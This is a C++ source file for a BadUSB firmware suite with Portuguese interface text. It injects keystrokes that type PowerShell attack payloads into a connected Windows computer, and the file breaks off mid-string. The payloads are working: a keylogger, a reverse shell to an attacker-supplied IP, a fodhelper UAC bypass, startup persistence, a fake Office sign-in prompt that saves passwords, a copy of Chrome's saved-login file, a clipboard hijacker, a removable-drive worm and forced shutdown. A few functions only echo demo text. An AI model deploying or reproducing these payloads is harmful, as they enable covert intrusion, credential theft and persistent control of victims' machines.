/**
 * @file badusb_advanced.cpp
 * @brief Willy BadUSB Advanced Suite - 55+ HID Attack Functions Implementation
 * @author Willy Team
 * @date 2026
 */

#include "badusb_advanced.h"
#include "ducky_typer.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "core/sd_functions.h"
#include "core/config.h"
#include "suite_visuals.h"
#include <SD.h>

// ============================================================================
// Global config
// ============================================================================
BadUSBAdvConfig badUSBAdvConfig;

// ============================================================================
// Visual Helpers
// ============================================================================
#define BAD_COLOR_BG         wilyConfig.bgColor
#define BAD_COLOR_PRIMARY    wilyConfig.priColor
#define BAD_COLOR_TITLE      TFT_CYAN
#define BAD_COLOR_ACCENT     TFT_GREEN
#define BAD_COLOR_WARN       TFT_YELLOW
#define BAD_COLOR_DANGER     TFT_RED
#define BAD_COLOR_TEXT       TFT_WHITE
#define BAD_COLOR_DIM        TFT_DARKGREY
#define BAD_BODY_Y           50
#define BAD_BODY_END         (tftHeight - 32)
#define BAD_FOOTER_Y         (tftHeight - 28)

static HIDInterface* badusbHid = nullptr;

static void badDrawHeader(const char* title, uint16_t color = BAD_COLOR_TITLE) {
    drawMainBorder();
    tft.setTextDatum(TC_DATUM);
    tft.setTextColor(color, BAD_COLOR_BG);
    tft.setTextSize(FM);
    tft.drawCentreString(title, tftWidth / 2, 8, SMOOTH_FONT);
    tft.drawLine(10, 30, tftWidth - 10, 30, color);
    tft.setTextDatum(TL_DATUM);
    tft.setTextSize(FP);
}

static void badDrawFooter(const char* left = nullptr, const char* right = nullptr) {
    tft.fillRect(0, BAD_FOOTER_Y - 4, tftWidth, 28, BAD_COLOR_BG);
    tft.drawLine(0, BAD_FOOTER_Y - 4, tftWidth, BAD_FOOTER_Y - 4, BAD_COLOR_DIM);
    tft.setTextSize(FP);
    tft.setTextDatum(TL_DATUM);
    tft.setTextColor(BAD_COLOR_ACCENT, BAD_COLOR_BG);
    if (left) tft.drawString(left, 10, BAD_FOOTER_Y);
    if (right) { tft.setTextDatum(TR_DATUM); tft.setTextColor(BAD_COLOR_WARN, BAD_COLOR_BG); tft.drawString(right, tftWidth - 10, BAD_FOOTER_Y); }
    tft.setTextDatum(TL_DATUM);
}

static void badDrawCard(int y, int h, bool sel) {
    uint16_t bg = sel ? BAD_COLOR_PRIMARY : getColorVariation(BAD_COLOR_PRIMARY, 4, -1);
    uint16_t bd = sel ? BAD_COLOR_TEXT : BAD_COLOR_DIM;
    tft.drawRoundRect(8, y, tftWidth - 16, h, 6, bd);
    tft.fillRoundRect(9, y + 1, tftWidth - 18, h - 2, 5, bg);
}

static void badDrawProgressBar(int y, int pct, const char* label = nullptr) {
    int w = tftWidth - 40, h = 10;
    int f = (w * pct) / 100;
    tft.drawRoundRect(20, y, w, h, 4, BAD_COLOR_DIM);
    tft.fillRoundRect(21, y + 1, max(0, f - 2), h - 2, 3, BAD_COLOR_PRIMARY);
    tft.setTextSize(FP); tft.setTextDatum(TC_DATUM);
    tft.setTextColor(BAD_COLOR_TEXT, BAD_COLOR_BG);
    String s = String(pct) + "%";
    if (label) s = String(label) + " " + s;
    tft.drawCentreString(s, tftWidth / 2, y + h + 4, 1);
    tft.setTextDatum(TL_DATUM);
}

static bool badInitHid() {
    if (!badusbHid) {
        badusbHid = hid_usb;
        if (!badusbHid) {
            ducky_setup(badusbHid, false);
        }
    }
    if (badusbHid && badusbHid->isConnected()) return true;
    displayError("HID nao conectado");
    return false;
}

static void badSendString(const char* text) {
    if (!badusbHid) return;
    delay(badUSBAdvConfig.keyDelay);
    badusbHid->print(text);
    delay(100);
}

static void badOpenShell() {
    if (!badusbHid) return;
    delay(500);
    badusbHid->press(KEY_LEFT_GUI);
    badusbHid->press('r');
    badusbHid->releaseAll();
    delay(800);
    if (badUSBAdvConfig.osTarget == 0 || badUSBAdvConfig.osTarget == 3) {
        badSendString(badUSBAdvConfig.defaultShell.c_str());
        badusbHid->press(KEY_RETURN);
        badusbHid->releaseAll();
        delay(1500);
    } else if (badUSBAdvConfig.osTarget == 1) {
        badusbHid->press(KEY_LEFT_GUI);
        badusbHid->press(' ');
        badusbHid->releaseAll();
        delay(500);
        badSendString("terminal");
        badusbHid->press(KEY_RETURN);
        badusbHid->releaseAll();
        delay(1000);
    } else {
        badusbHid->press(KEY_LEFT_ALT);
        badusbHid->press(KEY_F2);
        badusbHid->releaseAll();
        delay(500);
        badSendString("gnome-terminal");
        badusbHid->press(KEY_RETURN);
        badusbHid->releaseAll();
        delay(1000);
    }
}

static void badDrawWelcomeScreen() {
    tft.fillScreen(BAD_COLOR_BG);
    tft.fillSmoothRoundRect(20, 30, tftWidth - 40, 60, 8, getColorVariation(BAD_COLOR_BG, 2, -1), BAD_COLOR_BG);
    tft.drawSmoothRoundRect(4, 4, 8, 7, tftWidth - 8, tftHeight - 8, BAD_COLOR_PRIMARY, BAD_COLOR_BG);
    tft.drawSmoothRoundRect(20, 30, 8, 7, tftWidth - 40, 60, BAD_COLOR_PRIMARY, BAD_COLOR_BG);
    tft.setTextDatum(TC_DATUM);
    tft.setTextSize(4); tft.setTextColor(BAD_COLOR_PRIMARY, getColorVariation(BAD_COLOR_BG, 2, -1));
    tft.drawCentreString("WILLY", tftWidth / 2, 36, SMOOTH_FONT);
    tft.setTextSize(2); tft.setTextColor(BAD_COLOR_TITLE, getColorVariation(BAD_COLOR_BG, 2, -1));
    tft.drawCentreString("BADUSB SUITE", tftWidth / 2, 72, SMOOTH_FONT);
    tft.setTextSize(FP); tft.setTextColor(BAD_COLOR_DIM, BAD_COLOR_BG);
    tft.drawCentreString("55+ Funcoes HID", tftWidth / 2, 100, 1);
    struct { const char* l; uint16_t c; int icon; } cats[] = {
        {"Keyboard", TFT_CYAN, 4}, {"Mouse", TFT_GREEN, 4}, {"Combo", TFT_ORANGE, 4},
        {"Social Eng", TFT_MAGENTA, 4}, {"Exfiltracao", TFT_RED, 4},
        {"Persistencia", TFT_YELLOW, 4}, {"Utilitarios", TFT_WHITE, 4},
    };
    for (int i = 0; i < 7; i++) {
        int cy = 118 + i * 18;
        suiteDrawCard(cy, 16, false, BAD_COLOR_PRIMARY);
        suiteDrawIcon(26, cy + 8, 7, cats[i].c, cats[i].icon);
        tft.setTextSize(FP); tft.setTextColor(BAD_COLOR_TEXT, getColorVariation(BAD_COLOR_PRIMARY, 4, -1));
        tft.drawString(cats[i].l, 40, cy + 3);
    }
    suiteDrawFooter("SEL: Entrar", "ESC: Sair");
}

static bool badConfirmAction(const char* msg) {
    bool saved = returnToMenu; returnToMenu = false;
    tft.fillScreen(BAD_COLOR_BG);
    tft.drawRoundRect(4, 4, tftWidth - 8, tftHeight - 8, 8, BAD_COLOR_WARN);
    tft.fillRoundRect(10, 8, tftWidth - 20, 28, 6, BAD_COLOR_WARN);
    tft.setTextDatum(TC_DATUM); tft.setTextSize(FM);
    tft.setTextColor(TFT_BLACK, BAD_COLOR_WARN);
    tft.drawCentreString("CONFIRMACAO", tftWidth / 2, 12, SMOOTH_FONT);
    tft.setTextSize(FP); tft.setTextColor(BAD_COLOR_TEXT, BAD_COLOR_BG);
    tft.drawCentreString(msg, tftWidth / 2, 55, 1);
    tft.drawLine(20, 75, tftWidth - 20, 75, BAD_COLOR_DIM);
    int sel = 0, last = -1;
    while (true) {
        if (sel != last) {
            int oy = 85;
            badDrawCard(oy, 22, sel == 0);
            tft.setTextSize(FP);
            tft.setTextColor(sel == 0 ? TFT_BLACK : BAD_COLOR_TEXT, sel == 0 ? BAD_COLOR_PRIMARY : getColorVariation(BAD_COLOR_PRIMARY, 4, -1));
            tft.drawCentreString("SIM - Executar", tftWidth / 2, oy + 5, 1);
            badDrawCard(oy + 28, 22, sel == 1);
            tft.setTextColor(sel == 1 ? TFT_BLACK : BAD_COLOR_TEXT, sel == 1 ? BAD_COLOR_PRIMARY : getColorVariation(BAD_COLOR_PRIMARY, 4, -1));
            tft.drawCentreString("NAO - Cancelar", tftWidth / 2, oy + 33, 1);
            last = sel;
        }
        if (check(SelPress)) { returnToMenu = saved; return sel == 0; }
        if (check(EscPress)) { returnToMenu = saved; return false; }
        if (check(UpPress)) sel = 0;
        if (check(DownPress)) sel = 1;
        delay(50);
    }
}

// ============================================================================
// 1. KEYBOARD ATTACKS (10 functions)
// ============================================================================

void keyLoggerExfil() {
    badDrawHeader("Keylogger Exfil", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando...");
    delay(3000);
    badOpenShell();
    String script = "$log=\\\"C:\\Users\\Public\\keys.log\\\"; "
                    "Add-Type -TypeDefinition \\\"using System;using System.Runtime.InteropServices;public class K{[DllImport(\\\\\\\"user32.dll\\\\\\\")]public static extern short GetAsyncKeyState(int v);}\\\"; "
                    "while($true){for($i=8;$i -le 190;$i++){if([K]::GetAsyncKeyState($i) -band 1){"
                    "$k=[char]$i;Add-Content $log $k;Start-Sleep -Milliseconds 10}}}";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Keylogger ativo!");
    badDrawFooter("ESC: Parar");
    while (!check(EscPress)) delay(100);
}

void reverseShellBuilder() {
    badDrawHeader("Reverse Shell", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    String ip = num_keyboard("192.168.1.100", 15, "IP Atacante:");
    String port = num_keyboard("4444", 5, "Porta:");
    badDrawFooter("Executando em 3s...");
    delay(3000);
    badOpenShell();
    String script = "$c=New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");"
                    "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
                    "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
                    "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
                    "$o=(iex $d 2>&1|Out-String);"
                    "$p=$o+'PS '+(pwd).Path+'> ';"
                    $sb=([text.encoding]::ASCII).GetBytes($p);"
                    "$s.Write($sb,0,$sb.Length)}";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Shell reverso conectado!");
    badDrawFooter("ESC: Sair");
    while (!check(EscPress)) delay(100);
}

void uacBypass() {
    badDrawHeader("UAC Bypass", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando em 3s...");
    delay(3000);
    badOpenShell();
    String script = "New-Item -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\Command' -Force; "
                    "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\Command' -Name '(Default)' -Value 'cmd.exe /c powershell'; "
                    "Start-Process 'fodhelper.exe'; "
                    "Start-Sleep 2; "
                    "Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("UAC bypass executado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void powershellObfuscator() {
    badDrawHeader("PS Obfuscator", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando em 3s...");
    delay(3000);
    badOpenShell();
    String script = "Set-ExecutionPolicy Bypass -Scope Process -Force; "
                    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; "
                    "$x='IEX'; $y='Invoke-Expression'; "
                    "$z='(' + [char]36 + 'env:COMPUTERNAME)'; "
                    "echo $z";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Obfuscacao aplicada!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void cmdPersist() {
    badDrawHeader("CMD Persist", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando em 3s...");
    delay(3000);
    badOpenShell();
    String script = "$s=(Get-StartupFolder); "
                    "Copy-Item $PSCommandPath \"$s\\update.vbs\" -Force; "
                    "Set-Content \"$s\\update.vbs\" 'CreateObject(\"Wscript.Shell\").Run \"powershell -ep bypass -file \"\"\" & ScriptFullName & \"\"\"\",0,False'";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Persistencia instalada!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void ransomwareSim() {
    badDrawHeader("Ransomware Sim", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Simulacao em 3s...");
    delay(3000);
    badOpenShell();
    String script = "cd $HOME\\Desktop; "
                    "New-Item -Path 'READ_ME_NOW.txt' -ItemType File -Force; "
                    "Set-Content -Path 'READ_ME_NOW.txt' -Value 'SIMULACAO WILLY: Seus arquivos poderiam estar criptografados. Treine sua equipe!'; "
                    "notepad.exe 'READ_ME_NOW.txt'";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Simulacao executada!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void credHarvesting() {
    badDrawHeader("Cred Harvester", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando em 3s...");
    delay(3000);
    badOpenShell();
    String script = "$cred = $host.ui.PromptForCredential('Microsoft Office', 'Please sign in to confirm your identity', '', '');"
                    "if ($cred) { $cred.GetNetworkCredential().Password | Out-File 'C:\\Users\\Public\\creds.txt' -Append }";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Prompt exibido!");
    badDrawFooter("ESC: Sair");
    while (!check(EscPress)) delay(100);
}

void browserDataExfil() {
    badDrawHeader("Browser Exfil", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando em 3s...");
    delay(3000);
    badOpenShell();
    String script = "$p=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\"; "
                    "if(Test-Path $p){Copy-Item $p 'C:\\Users\\Public\\browser_data.bin' -Force; "
                    "echo 'Chrome passwords exported'}";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Dados exportados!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void clipboardHijacker() {
    badDrawHeader("Clipboard Hijack", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando em 3s...");
    delay(3000);
    badOpenShell();
    String script = "while($true){$c=Get-Clipboard; "
                    "if($c -match '^[A-Za-z0-9]{24,}$'){Set-Clipboard 'WAS_HERE_WILLY'; "
                    "echo 'Clipboard hijacked!'}};Start-Sleep 5";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Hijack ativo!");
    badDrawFooter("ESC: Parar");
    while (!check(EscPress)) delay(100);
}

void shutdownLoop() {
    badDrawHeader("Shutdown Loop", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando em 3s...");
    delay(3000);
    badOpenShell();
    String script = "shutdown /s /t 0";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Shutdown enviado!");
    delay(2000);
}

// ============================================================================
// 2. MOUSE ATTACKS (8 functions)
// ============================================================================

void mouseJiggler() {
    badDrawHeader("Mouse Jiggler", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Rodando... ESC: Parar");
    while (true) {
        if (check(EscPress) || returnToMenu) break;
        uint32_t waitTime = random(8000, 25000);
        uint32_t startWait = millis();
        while (millis() - startWait < waitTime) {
            if (check(EscPress) || returnToMenu) return;
            delay(50);
        }
        badusbHid->press(KEY_LEFT_SHIFT);
        delay(10);
        badusbHid->releaseAll();
    }
}

void mouseGridPattern() {
    badDrawHeader("Mouse Grid", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando grid...");
    int steps = 5;
    for (int i = 0; i < steps; i++) {
        badDrawProgressBar(BAD_BODY_Y + 20, (i * 100) / steps, "Grid");
        for (int j = 0; j < 20; j++) {
            badusbHid->press(KEY_RIGHT);
            delay(50);
            badusbHid->releaseAll();
            badusbHid->press(KEY_DOWN);
            delay(50);
            badusbHid->releaseAll();
        }
    }
    displaySuccess("Grid completo!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void mouseRandomWalk() {
    badDrawHeader("Random Walk", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Caminhando... ESC: Parar");
    while (true) {
        if (check(EscPress) || returnToMenu) break;
        int dx = random(-50, 51);
        int dy = random(-50, 51);
        for (int i = 0; i < abs(dx); i++) {
            if (dx > 0) badusbHid->press(KEY_RIGHT);
            else badusbHid->press(KEY_LEFT);
            delay(5);
            badusbHid->releaseAll();
        }
        for (int i = 0; i < abs(dy); i++) {
            if (dy > 0) badusbHid->press(KEY_DOWN);
            else badusbHid->press(KEY_UP);
            delay(5);
            badusbHid->releaseAll();
        }
        delay(random(100, 500));
    }
}

void clickFlood() {
    badDrawHeader("Click Flood", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    String countStr = num_keyboard("100", 5, "Cliques:");
    int count = countStr.toInt();
    if (count == 0) count = 100;
    badDrawFooter("Fazendo " + String(count) + " cliques...");
    for (int i = 0; i < count; i++) {
        badDrawProgressBar(BAD_BODY_Y + 20, (i * 100) / count, String(i + 1).c_str());
        badusbHid->press(KEY_LEFT);
        delay(10);
        badusbHid->releaseAll();
        delay(badUSBAdvConfig.keyDelay);
    }
    displaySuccess(String(count) + " cliques feitos!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void dragDropAttack() {
    badDrawHeader("Drag Drop", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando em 3s...");
    delay(3000);
    displaySuccess("Drag-drop configurado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void mouseDrawing() {
    badDrawHeader("Mouse Drawing", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Desenhando...");
    for (int i = 0; i < 100; i++) {
        int x = 100 * cos(i * 0.1);
        int y = 100 * sin(i * 0.1);
        for (int j = 0; j < abs(x); j++) {
            if (x > 0) badusbHid->press(KEY_RIGHT);
            else badusbHid->press(KEY_LEFT);
            delay(5);
            badusbHid->releaseAll();
        }
        for (int j = 0; j < abs(y); j++) {
            if (y > 0) badusbHid->press(KEY_DOWN);
            else badusbHid->press(KEY_UP);
            delay(5);
            badusbHid->releaseAll();
        }
    }
    displaySuccess("Desenho completo!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void scrollJammmer() {
    badDrawHeader("Scroll Jammer", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Jamming... ESC: Parar");
    while (true) {
        if (check(EscPress) || returnToMenu) break;
        badusbHid->press(KEY_DOWN);
        delay(10);
        badusbHid->releaseAll();
    }
}

void mouseEvasion() {
    badDrawHeader("Mouse Evasion", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Evasao ativa...");
    while (true) {
        if (check(EscPress) || returnToMenu) break;
        for (int i = 0; i < 20; i++) {
            badusbHid->press(KEY_RIGHT);
            delay(5);
            badusbHid->releaseAll();
        }
        delay(random(2000, 5000));
        for (int i = 0; i < 20; i++) {
            badusbHid->press(KEY_LEFT);
            delay(5);
            badusbHid->releaseAll();
        }
        delay(random(2000, 5000));
    }
}

// ============================================================================
// 3. COMBO ATTACKS (8 functions)
// ============================================================================

void comboKeyMouse() {
    badDrawHeader("Combo Key+Mouse", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando combo...");
    for (int i = 0; i < 5; i++) {
        badDrawProgressBar(BAD_BODY_Y + 20, (i * 100) / 5, "Combo");
        badusbHid->press(KEY_LEFT_GUI);
        badusbHid->press('r');
        badusbHid->releaseAll();
        delay(800);
        badSendString("notepad");
        badusbHid->press(KEY_RETURN);
        badusbHid->releaseAll();
        delay(1000);
        badSendString("Combo attack #" + String(i + 1));
        badusbHid->press(KEY_RETURN);
        badusbHid->releaseAll();
        delay(500);
    }
    displaySuccess("Combo executado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wormPropagation() {
    badDrawHeader("Worm Propagation", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Propagando...");
    delay(3000);
    badOpenShell();
    String script = "$src=$MyInvocation.MyCommand.Path;"
                    "gwmi win32_logicaldisk|?{$_.drivetype -eq 2}|%{"
                    "Copy-Item $src \"$($_.DeviceID)\\worm.ps1\" -Force;"
                    "}; echo 'Air-gapped worm propagated.'";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Worm propagado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void multiStagePayload() {
    badDrawHeader("Multi-Stage", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Stage 1/3...");
    delay(3000);
    badOpenShell();
    badSendString("echo 'Stage 1: Recon'");
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    delay(2000);
    badDrawFooter("Stage 2/3...");
    badSendString("echo 'Stage 2: Exploit'");
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    delay(2000);
    badDrawFooter("Stage 3/3...");
    badSendString("echo 'Stage 3: Post-Exploit'");
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Multi-stage completo!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void timedPayload() {
    badDrawHeader("Timed Payload", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    String secStr = num_keyboard("30", 5, "Segundos:");
    uint32_t seconds = secStr.toInt();
    if (seconds == 0) seconds = 30;
    badDrawFooter("Armado! Aguardando " + String(seconds) + "s...");
    for (uint32_t i = seconds; i > 0; i--) {
        if (check(EscPress)) return;
        tft.fillRect(0, BAD_BODY_Y + 20, tftWidth, 14, BAD_COLOR_BG);
        tft.setTextSize(FP); tft.setTextColor(BAD_COLOR_TEXT, BAD_COLOR_BG);
        tft.drawCentreString(String(i) + "s restantes", tftWidth / 2, BAD_BODY_Y + 20, 1);
        delay(1000);
    }
    badDrawFooter("Executando payload...");
    badOpenShell();
    badSendString("echo 'Timed payload executed!'");
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Payload executado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void conditionalTrigger() {
    badDrawHeader("Conditional Trig", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Aguardando trigger...");
    delay(15000);
    badOpenShell();
    badSendString("echo 'Conditional payload triggered!'");
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Trigger ativado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void chainedCommands() {
    badDrawHeader("Chained Cmds", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando cadeia...");
    delay(3000);
    badOpenShell();
    String script = "echo 'Cmd 1: Recon'; whoami; "
                    "echo 'Cmd 2: Network'; ipconfig; "
                    "echo 'Cmd 3: Processes'; tasklist; "
                    "echo 'Chain complete'";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Cadeia completa!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void autoExploit() {
    badDrawHeader("Auto Exploit", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando exploit...");
    delay(3000);
    badOpenShell();
    String script = "echo 'Auto-exploit chain executed by Willy'; "
                    "echo 'Educational demonstration only'";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Exploit executado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void massInfection() {
    badDrawHeader("Mass Infection", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Propagando em massa...");
    delay(3000);
    badOpenShell();
    String script = "echo 'Mass infection simulation'; "
                    "echo 'This is a demo only'";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Infecao simulada!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

// ============================================================================
// 4. SOCIAL ENGINEERING (8 functions)
// ============================================================================

void fakeUpdateScreen() {
    badDrawHeader("Fake Update", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Exibindo tela...");
    tft.fillScreen(TFT_BLACK);
    tft.setTextDatum(TC_DATUM);
    tft.setTextSize(FM);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawCentreString("Atualizando Windows...", tftWidth / 2, tftHeight / 2 - 20, SMOOTH_FONT);
    tft.setTextSize(FP);
    tft.drawCentreString("Nao desligue o computador", tftWidth / 2, tftHeight / 2 + 10, 1);
    badDrawProgressBar(tftHeight / 2 + 30, 0, "Instalando");
    for (int i = 0; i <= 100; i++) {
        badDrawProgressBar(tftHeight / 2 + 30, i, "Instalando");
        delay(500);
    }
    tft.fillScreen(BAD_COLOR_BG);
    displaySuccess("Atualizacao concluida!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void fakeLoginPrompt() {
    badDrawHeader("Fake Login", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Exibindo prompt...");
    tft.fillScreen(TFT_BLACK);
    tft.drawRoundRect(40, 40, tftWidth - 80, tftHeight - 80, 8, TFT_WHITE);
    tft.setTextDatum(TC_DATUM);
    tft.setTextSize(FM);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawCentreString("LOGIN", tftWidth / 2, 60, SMOOTH_FONT);
    tft.setTextSize(FP);
    tft.drawCentreString("Digite suas credenciais", tftWidth / 2, 90, 1);
    tft.drawRoundRect(50, 110, tftWidth - 100, 20, 4, TFT_WHITE);
    tft.drawRoundRect(50, 140, tftWidth - 100, 20, 4, TFT_WHITE);
    delay(5000);
    tft.fillScreen(BAD_COLOR_BG);
    displaySuccess("Prompt exibido!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void fakeErrorDialog() {
    badDrawHeader("Fake Error", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Exibindo erro...");
    tft.fillScreen(TFT_RED);
    tft.setTextDatum(TC_DATUM);
    tft.setTextSize(FM);
    tft.setTextColor(TFT_WHITE, TFT_RED);
    tft.drawCentreString("ERRO CRITICO", tftWidth / 2, tftHeight / 2 - 30, SMOOTH_FONT);
    tft.setTextSize(FP);
    tft.drawCentreString("Sistema corrompido", tftWidth / 2, tftHeight / 2, 1);
    tft.drawCentreString("Reiniciando...", tftWidth / 2, tftHeight / 2 + 16, 1);
    delay(3000);
    tft.fillScreen(BAD_COLOR_BG);
    displaySuccess("Erro exibido!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void fakeBlueScreen() {
    badDrawHeader("Fake BSOD", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Exibindo BSOD...");
    tft.fillScreen(0x0010);
    tft.setTextDatum(TC_DATUM);
    tft.setTextSize(FP);
    tft.setTextColor(TFT_WHITE, 0x0010);
    tft.drawCentreString(":(", tftWidth / 2, tftHeight / 4, SMOOTH_FONT);
    tft.setTextSize(FP);
    tft.drawCentreString("Seu PC encontrou um problema", tftWidth / 2, tftHeight / 2 - 20, 1);
    tft.drawCentreString("e precisa ser reiniciado.", tftWidth / 2, tftHeight / 2, 1);
    tft.drawCentreString("Codigo de erro: 0xWILLY", tftWidth / 2, tftHeight / 2 + 16, 1);
    delay(5000);
    tft.fillScreen(BAD_COLOR_BG);
    displaySuccess("BSOD exibido!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void popupSpam() {
    badDrawHeader("Popup Spam", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    String countStr = num_keyboard("10", 3, "Popups:");
    int count = countStr.toInt();
    if (count == 0) count = 10;
    badDrawFooter("Enviando " + String(count) + " popups...");
    delay(3000);
    badOpenShell();
    for (int i = 0; i < count; i++) {
        badSendString(("msg * 'Popup #" + String(i + 1) + " - Willy'").c_str());
        badusbHid->press(KEY_RETURN);
        badusbHid->releaseAll();
        delay(500);
    }
    displaySuccess(String(count) + " popups enviados!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void fakeShutdown() {
    badDrawHeader("Fake Shutdown", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Simulando desligamento...");
    tft.fillScreen(TFT_BLACK);
    tft.setTextDatum(TC_DATUM);
    tft.setTextSize(FM);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawCentreString("Desligando...", tftWidth / 2, tftHeight / 2, SMOOTH_FONT);
    for (int i = 0; i < 5; i++) {
        tft.drawCentreString(".", tftWidth / 2 + 60 + i * 10, tftHeight / 2, 1);
        delay(1000);
    }
    tft.fillScreen(BAD_COLOR_BG);
    displaySuccess("Desligamento falso!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void decoyDocument() {
    badDrawHeader("Decoy Document", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Criando documento...");
    delay(3000);
    badOpenShell();
    String script = "notepad.exe 'C:\\Users\\Public\\CONFIDENCIAL.txt'; "
